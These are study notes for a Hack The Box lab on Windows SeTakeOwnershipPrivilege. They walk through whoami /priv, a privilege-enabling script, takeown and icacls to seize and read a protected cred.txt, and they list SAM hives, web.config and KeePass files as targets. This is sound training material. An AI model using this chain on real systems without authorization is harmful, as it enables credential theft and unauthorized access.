This section covers **`SeTakeOwnershipPrivilege`**, a Windows user right that allows a user to take ownership of securable objects. It is especially useful when you encounter a file that you can locate but cannot read because of its ACLs.

The core attack chain is:

```text
SeTakeOwnershipPrivilege
        ↓
Take ownership of target
        ↓
Modify object's ACL
        ↓
Grant yourself access
        ↓
Read / modify sensitive data
        ↓
Credentials / keys / further access
```

![Image](https://images.openai.com/static-rsc-4/B2W_VDVgZ1D0ju6J7wJ48RaBjhbDT3BxWzBxxVzXPINhp_qZyVRtq27oiDwizqKofgYs7LWGa6I0dFPJBLJFmCyqFmtX50dMspnsV6QQcoqeVebvrecE_TCLrWToAxyuL68xLP0YzE7lTDpb6AezsAWnkdnV3i-vM84-Az3tW1SWocKpl_YhWPEf5ObnMGRD?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/z44ghJlHXuiv5YwHClPshzMx9NAGgHZP2y5ni2Id0CJ8Pcqsy_GdWWz4B8OC6GrbLUnkauXS_ra76R1U0B5Cg8oD0o1nwSBLI4DL0fVMuIkzPPUhXWj6DsgSsSe09TPpcihJZPxIzVa25nTr4AUZFaDVeSSiVAV8i7fAFqFcx_k_OAMWGQFIpLJjQHwDgBuf?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/4sX72MePL-NgChs4O5SA1p2OC9zJsD-1TWYFX4KOq31YV7Rh008-X8OMhR12inoaaQISak5Whapx0jy2KjSeT6FdvmAhbVyj7gKqdJPniSpX402EZzeyKGWj11s1YJU_XpRcC2V4KFTKLzJMTGUn3wmV8ET9FxCZzciXevcYPNnmbp--ukS9yytOsyzxzIhJ?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/LXVH7Sj2Qlh7Shxru6r0qASFkhx_VndyROoY4SBWkLgzr2mz_og2v14FF1_ZLzGfdHw2NFFG-VtLhD-ZVj5luWNFzlIQaFed5o-FdnSToujqHgmrn_HkpRkmd-IRPEk0KexG2CypJ5AhmGYZuppHK_O3V6ybbp6kok3ZWrnPeZ5U6q4hw-sJX7tk2v9tmBA6?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/Rt5UgMm-HnPm33CCsOtgg3J3uIxY31M9HISp9xIEk-IOOZCNblZuGDDxiMDesLGwxQBBfschnAnfOx_IsYopruEVoAD_U6KW5AT2DSbI2H0Zu8DJi2oVR77cXJiugdcW8c--hMNkT5Ix-Byad-KpkAcqdKNBMXX9DTIaR1tWASYOVWBId0IHX5P_e3dpNeUU?purpose=fullsize)

---

# 1. What Is `SeTakeOwnershipPrivilege`?

`SeTakeOwnershipPrivilege` gives a user the ability to take ownership of a **securable object**.

The source specifically lists:

- Active Directory objects
    
- NTFS files/folders
    
- Printers
    
- Registry keys
    
- Services
    
- Processes
    

The privilege gives the user `WRITE_OWNER` rights over an object, allowing the owner recorded in its security descriptor to be changed.

### Important distinction

**Taking ownership does NOT automatically mean you can read the file.**

This is one of the most important concepts in this module.

```text
Take ownership
      ↓
You become owner
      ↓
Still may have restrictive ACL
      ↓
Modify ACL
      ↓
Grant yourself permissions
      ↓
Access object
```

The HTB example explicitly demonstrates this sequence.

---

# 2. Where Is the Privilege Assigned?

The source gives the Group Policy path:

```text
Computer Configuration
    ↓
Windows Settings
    ↓
Security Settings
    ↓
Local Policies
    ↓
User Rights Assignment
    ↓
Take ownership of files or other objects
```

By default, administrators receive this privilege. It can also be assigned to service accounts for specific operational requirements such as backup/VSS operations.

---

# 3. Why Is It Interesting for Pentesting?

A user with this privilege could potentially take control of an object containing:

- Passwords
    
- SSH keys
    
- Application configuration
    
- Web configuration
    
- KeePass databases
    
- Scripts
    
- Other credentials
    

The source also notes that taking ownership can potentially lead to sensitive-data access, RCE, or DoS depending on the object.

### Example

Imagine:

```text
C:\Department Shares\Private\IT\cred.txt
```

You can **see the file exists**, but:

```text
Access denied
```

Normally:

```text
Can't read → stuck
```

With `SeTakeOwnershipPrivilege`:

```text
Take ownership
      ↓
Modify ACL
      ↓
Grant yourself Full Control
      ↓
Read file
```

---

# 4. First Step — Check Your Privileges

Always begin with:

```powershell
whoami /priv
```

Example:

```text
Privilege Name
----------------------------
SeTakeOwnershipPrivilege
```

The HTB example initially shows:

```text
SeTakeOwnershipPrivilege      Disabled
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Disabled
```

---

# 5. Enabling the Privilege

The source demonstrates using the supplied `EnableAllTokenPrivs.ps1` script.

Commands shown:

```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Afterwards:

```text
SeTakeOwnershipPrivilege      Enabled
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Enabled
```

### CPTS mental model

Don't stop at:

```text
SeTakeOwnershipPrivilege Disabled
```

The source demonstrates checking whether it can be enabled in the current context.

---

# 6. Finding a Target

The example uses a company file share.

Imagine:

```text
Department Shares
├── Public
└── Private
    ├── HR
    ├── Finance
    └── IT
```

The tester can browse directories but receives:

```text
Access denied
```

when attempting to read many files.

During enumeration, the tester finds:

```text
Private\IT\cred.txt
```

This becomes the target.

---

# 7. Check the File's Ownership

The source first uses PowerShell:

```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

The owner isn't displayed because the current account doesn't have sufficient permissions to view the ownership information.

So the source checks the parent directory:

```cmd
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

The result shows the directory is owned by:

```text
WINLPE-SRV01\sccm_svc
```

and contains:

```text
cred.txt
```

---

# 8. Take Ownership with `takeown`

Now comes the key step.

```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

Result:

```text
SUCCESS: The file (or folder):
"C:\Department Shares\Private\IT\cred.txt"
now owned by user "WINLPE-SRV01\htb-student".
```

### What changed?

Before:

```text
Owner → sccm_svc
```

After:

```text
Owner → htb-student
```

But **we still may not be able to read it**.

That's the critical point.

---

# 9. Ownership ≠ File Access

Try:

```powershell
cat 'C:\Department Shares\Private\IT\cred.txt'
```

The source gets:

```text
Access to the path ... is denied.
```

Why?

Because the **ACL hasn't changed yet**.

Think:

```text
OWNER
  │
  │ can potentially modify security permissions
  ▼
ACL
  │
  ├── Read
  ├── Write
  ├── Modify
  └── Full Control
```

Taking ownership changes the **owner**, not necessarily the existing ACEs.

---

# 10. Modify the ACL

The source then grants the current user Full Control using `icacls`:

```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

Where:

```text
/F = Full Control
```

The command successfully processes the file.

Now the effective path becomes:

```text
SeTakeOwnershipPrivilege
          ↓
takeown
          ↓
Become owner
          ↓
icacls
          ↓
Modify ACL
          ↓
Full Control
```

---

# 11. Read the File

Now:

```powershell
cat 'C:\Department Shares\Private\IT\cred.txt'
```

The example reveals credential information stored in the file.

This demonstrates the real-world impact:

```text
Restricted file
      ↓
Take ownership
      ↓
Change ACL
      ↓
Read sensitive information
      ↓
Credentials
      ↓
Potential further compromise
```

---

# 12. Very Important: Revert Your Changes

This is a **destructive action**.

The source specifically warns that changing ownership or permissions can:

- Break applications
    
- Disrupt users
    
- Affect important configuration files
    
- Be difficult to reverse when many directories are involved
    

For example, changing ownership of a live `web.config` without client consent could cause problems.

After testing:

```text
Restore original ownership
        +
Restore original ACL
        +
Document modifications
```

If restoration isn't possible, the source says to alert the client and document the changes in the report.

---

# 13. Files Worth Looking For

The source gives several examples of potentially interesting files:

```text
C:\inetpub\wwwwroot\web.config

%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security

%WINDIR%\system32\config\SecEvent.Evt

%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

The source also highlights:

```text
*.kdbx
OneNote notebooks
passwords.*
pass.*
creds.*
configuration files
scripts
virtual hard drive files
```

as possible sources of sensitive information.

---

# 🔥 SeTakeOwnershipPrivilege Attack Chain

Memorize this:

```text
             whoami /priv
                   │
                   ▼
      SeTakeOwnershipPrivilege
                   │
                   ▼
          Identify target file
                   │
                   ▼
        Check current owner
                   │
                   ▼
              takeown
                   │
                   ▼
          Become file owner
                   │
                   ▼
              icacls
                   │
                   ▼
       Grant yourself access
                   │
                   ▼
                 cat
                   │
                   ▼
       Sensitive information
```

---

# 🧠 SeTakeOwnership vs SeDebug vs SeImpersonate

This is where you should connect your last three HTB sections.

|Privilege|Think|
|---|---|
|`SeTakeOwnershipPrivilege`|**Own the object**|
|`SeDebugPrivilege`|**Access/control processes**|
|`SeImpersonatePrivilege`|**Impersonate another token**|
|`SeAssignPrimaryTokenPrivilege`|**Assign a token to a process**|

### Easy memory trick

```text
SeTakeOwnership
       ↓
       FILE

SeDebug
       ↓
     PROCESS

SeImpersonate
       ↓
      TOKEN
```

---

# 🎯 CPTS Enumeration Checklist

When you obtain a Windows shell:

```powershell
whoami
whoami /groups
whoami /priv
```

Then specifically search for:

```text
SeTakeOwnershipPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeLoadDriverPrivilege
SeBackupPrivilege
```

If you see:

```text
SeTakeOwnershipPrivilege
```

start thinking:

> **"What interesting object can I take ownership of?"**

Then enumerate:

```text
Files
Folders
Services
Registry
Configuration
Shares
AD objects
```

The source explicitly notes that the privilege applies broadly to securable objects, not just ordinary files.

---

# 🏆 CPTS Must-Know

### 1. What does `SeTakeOwnershipPrivilege` provide?

Ability to take ownership of securable objects.

### 2. What right does it give?

```text
WRITE_OWNER
```

### 3. Does taking ownership automatically grant read access?

**No.**

You may still need to modify the object's ACL.

### 4. What command takes ownership?

```powershell
takeown /f <file>
```

### 5. What command modifies the ACL?

```powershell
icacls <file> /grant <user>:F
```

### 6. What command checks privileges?

```powershell
whoami /priv
```

### 7. What's the complete practical chain?

```text
whoami /priv
      ↓
SeTakeOwnershipPrivilege
      ↓
takeown
      ↓
Become owner
      ↓
icacls
      ↓
Grant access
      ↓
Read sensitive file
```

### 8. What should you do after testing?

**Restore the original ownership and permissions whenever possible and document any changes.**

---

## 🔑 One-line memory trick

> **`SeTakeOwnershipPrivilege` = “I may not be allowed to access the object, but I can take ownership of it and then change its permissions.”**